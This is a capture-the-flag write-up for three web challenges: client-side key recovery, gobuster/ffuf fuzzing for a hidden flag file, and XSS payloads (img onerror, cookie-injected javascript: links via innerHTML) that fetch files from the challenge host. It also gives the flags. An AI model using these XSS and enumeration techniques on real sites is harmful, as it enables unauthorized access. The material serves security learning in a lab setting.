# Web Challenges

## We Rest Upon a Single Hope

### Description

I am Vinz, Vinz Clortho, Keymaster of Gozer. Volguus Zildrohar, Lord of the Sebouillia. Are you the Gatekeeper?

[Are you the Keymaster](https://nvstgt.com/Hope2/index.html)?

### Solution

We are asked to submit what seems to be a password, since we dont know it I decided to look into the source code and noticed that validation happens on frontend.

```js
...
<SCRIPT>
    function Gozer(key) {
        var hash = 0, i, chr;
        for (i = 0; i < key.length; i++) {
            chr   = key.charCodeAt(i);
            hash  = ((hash << 5) - hash) + chr;
            hash |= 0;
        }
        return hash;
    }
    function conv(s)	{
        var a = [];
        for (var n = 0, l = s.length; n < l; n ++) {
            var hex = Number(s.charCodeAt(n)).toString(16);
            a.push(hex);
        }
        return a.join('');
    }
    function Zuul(key) {
        if (key == v) {
            var Gatekeeper = [];
            var y = [];
            var z = [];
            Gatekeeper[0] = "706f6374667b75777370";
            Gatekeeper[1] = "formal";
            Gatekeeper[2] = "88410";
            for (var i = 0, l = Gatekeeper[0].length; i < l; i ++) {
                if (i == 0 || i % 2 == 0) {
                    y += String.fromCharCode(parseInt((Gatekeeper[0].substring(i, i+2)), 16));
                }
            }
            z[0] = y;
            z[1] = Gatekeeper[2][3];
            z[2] = Gatekeeper[2][2] + Gatekeeper[1][3];
            z[3] = z[2][0] + Gatekeeper[1][5] + Gatekeeper[1][5];
            z[4] = (Gatekeeper[2]/12630) + "h" + z[2][0] + (Gatekeeper[2][0]-1);
            z[5] = z[4][0] + z[4][1] + '3' + Gatekeeper[1][2] + '3';
            z[6] = (Gatekeeper[2]/Gatekeeper[2]) + '5';
            z[7] = (Gatekeeper[2]*0) + Gatekeeper[1][0];
            z[8] = (Gatekeeper[2]/12630) + "h" + '3';
            z[9] = Gatekeeper[1][3] + (Gatekeeper[2]*0) + '5' + (Gatekeeper[2][0]-1);
            z[10] = 'r' + '3' + z[2][0] + Gatekeeper[1][5] + '}';
            console.log(z.join("_"));
        } else {
            console.log("Gozer the Traveler. He will come in one of the pre-chosen forms. During the rectification of the Vuldrini, the traveler came as a large and moving Torg! Then, during the third reconciliation of the last of the McKetrick supplicants, they chose a new form for him: that of a giant Slor! Many Shuvs and Zuuls knew what it was to be roasted in the depths of the Slor that day, I can tell you!");
        }
    }
    var p = navigator.mimeTypes+navigator.doNotTrack;
    var o = navigator.deviceMemory;
    var c = navigator.vendor+navigator.userAgent;
    var t = navigator.product+p;
    var f = o+c+p;
    var v = Gozer(p/((o+c)*t)+f);
</SCRIPT>
...
```

`Zuul` seems to be the `win` function, we just need to know the value of `v`. Because code is ran on frontend we can simply `console.log(v)` to get value. 

```js
> console.log(v)
-1822641936
```

```js
> Zuul(-1822641936) // or just Zuul(v) // Zuul -> Win Function, v -> Key
poctf{uwsp_1_4m_4ll_7h47_7h3r3_15_0f_7h3_m057_r34l}
```
::: tip Flag
`poctf{uwsp_1_4m_4ll_7h47_7h3r3_15_0f_7h3_m057_r34l}`
::: 

## Vigil of the Ceaseless Eyes

### Description

Hey, contestants! Allow me to take this opportunity to debut the hottest new social media platform on the planet. I call it  [ManyKins](https://nvstgt.com/ManyKin/index.html)! There is also ZERO chance it has ANY vulnerabilities that might allow one to find the flag.

Later revealed: `Flag location /secret/flag.pdf`

### Solution 

Using `<h1>XSS</h1>` to test for XSS we get xss triggered, text appears in H1 tag. Unfortunately `script` tag was not allowed, but there are many workarounds.

We had to find the flag first, it wasn't `/flag.txt` and it was later revealed that dirbusting was allowed. Using `gobuster` with `common.txt` wordlist we can find it easily.

```bash
└─$ gobuster dir -u https://nvstgt.com/ManyKin/ -w /usr/share/dirb/wordlists/common.txt | tee gobuster_scan; 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://nvstgt.com/ManyKin/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 2939]
/robots.txt           (Status: 403) [Size: 275]
/secret               (Status: 301) [Size: 317] [--> http://nvstgt.com/ManyKin/secret/]
/static               (Status: 301) [Size: 317] [--> http://nvstgt.com/ManyKin/static/]

===============================================================
Finished
===============================================================
```

`/secret/flag.txt` returned forbidden and XSS returned 404, so flag must have different extension.

```bash
# Get wordlist
└─$ cp /usr/share/seclists/Discovery/Web-Content/raft-small-extensions.txt . 
# Place `flag` at the end so wordlist becomes `flag.{extension_from_wordlist}`                                                                              
└─$ sed 's/^/flag/' raft-small-extensions.txt > flag-extensions.txt            
# Fuzz              
└─$ ffuf -w flag-extensions.txt -u https://nvstgt.com/ManyKin/secret/FUZZ -t 1 -mc all -fc 404 | tee flag-extensions.log

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0
________________________________________________

 :: Method           : GET
 :: URL              : https://nvstgt.com/ManyKin/secret/FUZZ
 :: Wordlist         : FUZZ: /home/<>/Desktop/CTFs/PointerOverflow/2023/Vigil of the Ceaseless Eyes/flag-extensions.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 1
 :: Matcher          : Response status: all
 :: Filter           : Response status: 404
________________________________________________

[Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 159ms]
    * FUZZ: flag.txt

[Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 158ms]
    * FUZZ: flag.pgsql.txt

[Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 163ms]
    * FUZZ: flag.mysql.txt

[Status: 200, Size: 31, Words: 1, Lines: 1, Duration: 160ms]
    * FUZZ: flag.pdf
...
```::: danger :no_entry:
Use low number of threads (-t) to make requests go slow, otherwise you'll get ip banned!
:::

XSS Payload:

```html
<!-- 
<script>
  const xhr = new XMLHttpRequest();
  xhr.open("GET", "https://nvstgt.com/ManyKin/secret/flag.pdf");
  xhr.onload = () => console.log(xhr.response);
  xhr.send();
</script> 
-->

<img
  src="x"
  onerror="const xhr = new XMLHttpRequest(); xhr.open('GET', 'https://nvstgt.com/ManyKin/secret/flag.pdf'); xhr.onload = () => console.log(xhr.response); xhr.send();"
/>
```
::: tip Flag
`poctf{uwsp_71m3_15_4n_1llu510n}`
:::

### Note

Turned out you could just `curl` the file.

## Quantity is Not Abundance

### Description

That flag is in an internal location on this site

Once you know where it is, manipulate the site's function to get it!

[Go to Quantity is Not Abundance](https://nvstgt.com/Quantity/index.html)

Hint 1: under /.secret/
Hint 2: under /.secret/flag.txt

### Solution

Source: [tic.js](https://nvstgt.com/Quantity/static/tic.js)

```js
// Function called whenever user tab on any box
async function checkCookie(secret) { 
  	let msg = "Despite My Best Efforts To The Contrary... It Turns Out I've Won."; 
	document.cookie = msg;
}
...
// Checking of Player 0 finish
// Here, Checking about Tie
else if ((b1 == 'X' || b1 == '0') && (b2 == 'X'
	|| b2 == '0') && (b3 == 'X' || b3 == '0') &&
	(b4 == 'X' || b4 == '0') && (b5 == 'X' ||
	b5 == '0') && (b6 == 'X' || b6 == '0') &&
	(b7 == 'X' || b7 == '0') && (b8 == 'X' ||
	b8 == '0') && (b9 == 'X' || b9 == '0')) {
		checkCookie(document.cookie);
   		window.alert('Match Tie');
    	document.getElementById('print').innerHTML = document.cookie;
}
```

If there's tie `print` html element is assigned `document.cookie` and `innerHTML` is direct XSS.

I wasnt able to put whole payload inside the cookie, so I split payload into chunks.

Verbose Payload: 
```js
var xhr = new XMLHttpRequest();
xhr.open(`GET`, `https://nvstgt.com/Quantity/.secret/flag.txt`);
xhr.onload = () => console.log(xhr.response);
xhr.send();
```

Payload:

```js
document.cookie='1=<a href="javascript:var xhr=new XMLHttpRequest()">Payload 1</a>';
document.cookie='2=<a href="javascript:xhr.open(`GET`,`https://nvstgt.com/Quantity/.secret/flag.txt`)">Payload 2</a>';
document.cookie='3=<a href="javascript:xhr.onload=()=>console.log(xhr.response)">Payload 3</a>';
document.cookie='4=<a href="javascript:xhr.send()">Payload 4</a>';
// Win automatically
b1.click();b4.click();b2.click();b5.click();b6.click();b3.click();b7.click();b8.click();b9.click();
```

Clicking `a` tags in order `console.log` should appear: `poctf{uwsp_1_h4v3_70_1n5157}`
::: tip Flag
`poctf{uwsp_1_h4v3_70_1n5157}`
:::